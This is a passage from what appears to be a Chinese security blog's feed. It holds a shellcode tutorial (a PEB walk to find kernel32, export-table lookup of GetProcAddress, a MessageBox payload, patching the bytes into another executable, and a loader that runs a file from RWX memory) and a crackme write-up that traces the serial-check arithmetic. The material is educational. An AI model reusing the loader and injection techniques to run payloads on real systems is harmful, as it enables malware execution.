(FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA);<br><span class="hljs-keyword">char</span> szMessageBoxA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(WINAPI* FN_MessageBoxA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT uType)</span></span>;<br><span class="hljs-keyword">char</span> szUser32[] = &#123; <span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(szUser32), szMessageBoxA);<br><span class="hljs-keyword">char</span> szHello[] = &#123; <span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> szTitle[] = &#123; <span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>fn_MessageBoxA(<span class="hljs-literal">NULL</span>, szHello, szTitle, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax, [eax + <span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret<br>&#125;<br>&#125;<br><br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader +<br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span>* lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后使用PEID查看偏移，可以看到是200,</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/10.png"></p><p>然后使用十六进制编辑器将其中的机器码拷贝出来。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/11.png"></p><p>选取一个替代的程序，查看其偏移</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/12.png"></p><p>然后进入编辑器，从偏移开始粘贴我们的机器码</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/13.png"></p><p>然后打开这个程序就会实现shellcode编写的弹窗效果了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/14.png"></p><h4 id="第二种shellcode生成框架"><a href="#第二种shellcode生成框架" class="headerlink" title="第二种shellcode生成框架"></a>第二种shellcode生成框架</h4><h5 id="单文件的函数生成位置规律"><a href="#单文件的函数生成位置规律" class="headerlink" title="单文件的函数生成位置规律"></a>单文件的函数生成位置规律</h5><p>单文件的函数生成规律，与函数实现的先后顺序有关，与定义的顺序无关。</p><p>如这样一个程序，定义的顺序是先A，后B</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/15.png"></p><p>在IDA中可以看到顺序是先B后A。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/16.png"></p><h5 id="多文件生成规律"><a href="#多文件生成规律" class="headerlink" title="多文件生成规律"></a>多文件生成规律</h5><p>与包含的文件位置无关，与实际调用顺序有关。</p><p>在文件中的.vcxproj文件，如图此时是这个顺序，可以看到编译顺序一致。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/17.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/18.png"></p><p>修改一下顺序，编译顺序也会改变</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/19.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/20.png"></p><h5 id="实际编写"><a href="#实际编写" class="headerlink" title="实际编写"></a>实际编写</h5><p>在其中定义几个文件</p><ul><li>0.entry.cpp：入口点</li><li>a.start.cpp：shellcode执行</li><li>z.end.cpp：shellcode结束</li></ul><p>a-z之间可以放shellcode的所有功能的具体实现。在0.entry中写创建文件，根据文件的生成规律，可以知道文件的大小就是a.start.cpp中的ShellcodeEnd - z.end.cpp中的ShellcodeStart。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">HANDLE hBin = <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">&quot;sh.bin&quot;</span>, GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;<br>DWORD dwWrite;<br><span class="hljs-built_in">WriteFile</span>(hBin, ShellcodeStart, dwSize, &amp;dwWrite, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hBin);<br></code></pre></div></td></tr></table></figure><h5 id="shellcode加载器"><a href="#shellcode加载器" class="headerlink" title="shellcode加载器"></a>shellcode加载器</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(argv[<span class="hljs-number">1</span>], GENERIC_READ, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_ALWAYS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>DWORD dwSize;<br>dwSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID lpAddr = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (lpAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;virtual failed\n&quot;</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>DWORD dwRead;<br><span class="hljs-built_in">ReadFile</span>(hFile, lpAddr, dwSize, &amp;dwRead, <span class="hljs-number">0</span>);<br>__asm &#123;<br>call lpAddr<br>&#125;<br>_flushall();<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/21.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;shellcode学习&quot;&gt;&lt;a href=&quot;#shellcode学习&quot; class=&quot;headerlink&quot; title=&quot;shellcode学习&quot;&gt;&lt;/a&gt;shellcode学习&lt;/h3&gt;&lt;h4 id=&quot;编译器的一些设置&quot;&gt;&lt;a href=&quot;#编译器的一些设置&quot;</summary>
      
    
    
    
    <category term="ShellCode" scheme="https://b1ackie.cn/categories/ShellCode/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="ShellCode" scheme="https://b1ackie.cn/tags/ShellCode/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-003</title>
    <link href="https://b1ackie.cn/2021/07/21/160CrackMe-003/"/>
    <id>https://b1ackie.cn/2021/07/21/160CrackMe-003/</id>
    <published>2021-07-21T07:11:38.000Z</published>
    <updated>2021-08-09T10:53:52.616Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序看到需要输入用户名和序列号尝试输入后提示错误</p><p><img src="/2021/07/21/160CrackMe-003/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用工具查看，发现未加壳，语言是VB。</p><p><img src="/2021/07/21/160CrackMe-003/2.png"></p><p>用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0]</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">004081E3</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">18</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaHresu&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaHresultCheckObj<br><span class="hljs-attribute">004081E9</span>   &gt;  <span class="hljs-number">8</span>B<span class="hljs-number">95</span> <span class="hljs-number">50</span>FFFFFF mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xB<span class="hljs-number">0</span>]<br><span class="hljs-attribute">004081EF</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> E<span class="hljs-number">4</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>C]          ;  获取输入的name<br><span class="hljs-attribute">004081F2</span>   .  <span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-number">00004000</span> ???<br><span class="hljs-attribute">004081F3</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">1</span>A          mov ebx,dword ptr ds:[edx]               ; |<br><span class="hljs-attribute">004081F5</span>   .  FF<span class="hljs-number">15</span> F<span class="hljs-number">8</span>B<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaLenBs&gt;; \获取name长度<br><span class="hljs-attribute">004081FB</span>   .  <span class="hljs-number">8</span>BF<span class="hljs-number">8</span>          mov edi,eax<br><span class="hljs-attribute">004081FD</span>   .  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D E<span class="hljs-number">8</span>       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">18</span>]<br><span class="hljs-attribute">00408200</span>   .  <span class="hljs-number">69</span>FF <span class="hljs-number">385</span>B<span class="hljs-number">0100</span> imul edi,edi,<span class="hljs-number">0</span>x<span class="hljs-number">15</span>B<span class="hljs-number">38</span>                     ;  长度乘以<span class="hljs-number">0</span>x<span class="hljs-number">15</span>B<span class="hljs-number">38</span><br><span class="hljs-attribute">00408206</span>   .  <span class="hljs-number">51</span>            push ecx                                 ; /String = <span class="hljs-number">091</span>C<span class="hljs-number">840</span>A ???<br><span class="hljs-attribute">00408207</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">80</span> B<span class="hljs-number">7050000</span> jo AfKayAs_.<span class="hljs-number">004087</span>C<span class="hljs-number">4</span>                     ; |<br><span class="hljs-attribute">0040820D</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">0</span>CB<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.#<span class="hljs-number">516</span>&gt;]     ; \获取输入name的第一次ascii码<br><span class="hljs-attribute">00408213</span>   .  <span class="hljs-number">0</span>FBFD<span class="hljs-number">0</span>        movsx edx,ax<br><span class="hljs-attribute">00408216</span>   .  <span class="hljs-number">03</span>FA          add edi,edx                              ;  长度计算后加上name[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00408218</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">80</span> A<span class="hljs-number">6050000</span> jo AfKayAs_.<span class="hljs-number">004087</span>C<span class="hljs-number">4</span><br><span class="hljs-attribute">0040821E</span>   .  <span class="hljs-number">57</span>            push edi                                 ;  Msvbvm<span class="hljs-number">50</span>.__vbaObjSet<br><span class="hljs-attribute">0040821F</span>   .  FF<span class="hljs-number">15</span> F<span class="hljs-number">4</span>B<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaStrI<span class="hljs-number">4</span>&gt;;  转字符串（十进制）<br></code></pre></div></td></tr></table></figure><p>然后将结果转为浮点数执行了几次操作。</p><p>第一次</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004082E9</span>   .  FF15 <span class="hljs-number">74</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  转为浮点数<br><span class="hljs-number">004082</span>EF   .  D905 <span class="hljs-number">08104000</span> fld dword ptr ds:[<span class="hljs-number">0</span>x401008]              ;  １０<br><span class="hljs-number">004082</span>F5   .  <span class="hljs-number">833</span>D <span class="hljs-number">00904000</span>&gt;cmp dword ptr ds:[<span class="hljs-number">0</span>x409000],<span class="hljs-number">0</span>x0<br><span class="hljs-number">004082</span>FC   .  <span class="hljs-number">75</span> <span class="hljs-number">08</span>         jnz short AfKayAs_.<span class="hljs-number">00408306</span><br><span class="hljs-number">004082</span>FE   .  D835 <span class="hljs-number">0</span>C104000 fdiv dword ptr ds:[<span class="hljs-number">0</span>x40100C]             ;  １０／５<br><span class="hljs-symbol">00408304 </span>  .  EB <span class="hljs-number">0</span>B         jmp short AfKayAs_.<span class="hljs-number">00408311</span><br><span class="hljs-symbol">00408306 </span>  &gt;  FF35 <span class="hljs-number">0</span>C104000 push dword ptr ds:[<span class="hljs-number">0</span>x40100C]<br><span class="hljs-number">0040830</span>C   .  E8 <span class="hljs-number">578</span>DFFFF   <span class="hljs-keyword">call</span> &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;<br><span class="hljs-symbol">00408311 </span>  &gt;  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00408314 </span>  .  DFE0          fstsw ax<br><span class="hljs-symbol">00408316 </span>  .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-symbol">00408318 </span>  .  <span class="hljs-number">0</span>F85 A1040000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-number">0040831</span>E   .  DEC1          faddp st(<span class="hljs-number">1</span>),st                           ;  ＋２<br><span class="hljs-symbol">00408320 </span>  .  DFE0          fstsw ax<br><span class="hljs-symbol">00408322 </span>  .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-symbol">00408324 </span>  .  <span class="hljs-number">0</span>F85 <span class="hljs-number">95040000</span> jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-number">0040832</span>A   .  DD1C24        fstp qword ptr ss:[esp]<br><span class="hljs-number">0040832</span>D   .  FF15 <span class="hljs-number">48</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  转回去<br></code></pre></div></td></tr></table></figure><p>第二次</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004083</span>F5   .  FF15 <span class="hljs-number">74</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  Msvbvm50.__vbaR8Str<br><span class="hljs-number">004083</span>FB   .  DC0D <span class="hljs-number">10104000</span> fmul qword ptr ds:[<span class="hljs-number">0</span>x401010]             ;  ＊３<br><span class="hljs-symbol">00408401 </span>  .  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00408404 </span>  .  DC25 <span class="hljs-number">18104000</span> fsub qword ptr ds:[<span class="hljs-number">0</span>x401018]             ;  －２<br><span class="hljs-number">0040840</span>A   .  DFE0          fstsw ax<br><span class="hljs-number">0040840</span>C   .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-number">0040840</span>E   .  <span class="hljs-number">0</span>F85 AB030000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-symbol">00408414 </span>  .  DD1C24        fstp qword ptr ss:[esp]<br><span class="hljs-symbol">00408417 </span>  .  FF15 <span class="hljs-number">48</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  Msvbvm50.__vbaStrR8<br></code></pre></div></td></tr></table></figure><p>第三次</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">004084DF</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">74</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaR<span class="hljs-number">8</span>Str&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaR<span class="hljs-number">8</span>Str<br><span class="hljs-attribute">004084E5</span>   .  DC<span class="hljs-number">25</span> <span class="hljs-number">20104000</span> fsub qword ptr ds:[<span class="hljs-number">0</span>x<span class="hljs-number">401020</span>]             ;  ＋１５<br><span class="hljs-attribute">004084EB</span>   .  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">004084EE</span>   .  DFE<span class="hljs-number">0</span>          fstsw ax<br><span class="hljs-attribute">004084F0</span>   .  A<span class="hljs-number">8</span> <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-attribute">004084F2</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">85</span> C<span class="hljs-number">7020000</span> jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-attribute">004084F8</span>   .  DD<span class="hljs-number">1</span>C<span class="hljs-number">24</span>        fstp qword ptr ss:[esp]<br><span class="hljs-attribute">004084FB</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">48</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaStrR<span class="hljs-number">8</span>&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaStrR<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><p>最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004085</span>F1   .  DCBD <span class="hljs-number">1</span>CFFFFFF fdivr qword ptr ss:[ebp-<span class="hljs-number">0</span>xE4]            ;  计算的ｓｅｒｉａｌ／输入<br><span class="hljs-number">004085</span>F7   .  EB <span class="hljs-number">11</span>         jmp short AfKayAs_.<span class="hljs-number">0040860</span>A<br><span class="hljs-number">004085</span>F9   &gt;  FFB5 <span class="hljs-number">20</span>FFFFFF push dword ptr ss:[ebp-<span class="hljs-number">0</span>xE0]<br><span class="hljs-number">004085</span>FF   .  FFB5 <span class="hljs-number">1</span>CFFFFFF push dword ptr ss:[ebp-<span class="hljs-number">0</span>xE4]<br><span class="hljs-symbol">00408605 </span>  .  E8 <span class="hljs-number">888</span>AFFFF   <span class="hljs-keyword">call</span> &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;<br><span class="hljs-number">0040860</span>A   &gt;  DFE0          fstsw ax<br><span class="hljs-number">0040860</span>C   .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-number">0040860</span>E   .  <span class="hljs-number">0</span>F85 AB010000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-symbol">00408614 </span>  .  FF15 <span class="hljs-number">34</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;;  Msvbvm50.__vbaFpR8<br><span class="hljs-number">0040861</span>A   .  DC1D <span class="hljs-number">28104000</span> fcomp qword ptr ds:[<span class="hljs-number">0</span>x401028]            ;  结果与１进行比较<br><span class="hljs-symbol">00408620 </span>  .  DFE0          fstsw ax                                 ;  将寄存器的值传给ＡＸ<br><span class="hljs-symbol">00408622 </span>  .  F6C4 <span class="hljs-number">40</span>       test ah,<span class="hljs-number">0</span>x40                             ;  比较ａｈ值与０ｘ４０<br><span class="hljs-symbol">00408625 </span>  .  <span class="hljs-number">74</span> <span class="hljs-number">07</span>         je short AfKayAs_.<span class="hljs-number">0040862</span>E               ;  若不相等就会跳到清空ｅｓｉ处<br><span class="hljs-symbol">00408627 </span>  .  BE <span class="hljs-number">01000000</span>   mov esi,<span class="hljs-number">0</span>x1                              ;  相等ｅｓｉ赋值１<br><span class="hljs-number">0040862</span>C   .  EB <span class="hljs-number">02</span>         jmp short AfKayAs_.<span class="hljs-number">00408630</span><br><span class="hljs-number">0040862</span>E   &gt;  <span class="hljs-number">33</span>F6          <span class="hljs-keyword">xor</span> esi,esi                              ;  清空寄存器<br></code></pre></div></td></tr></table></figure><p>这里 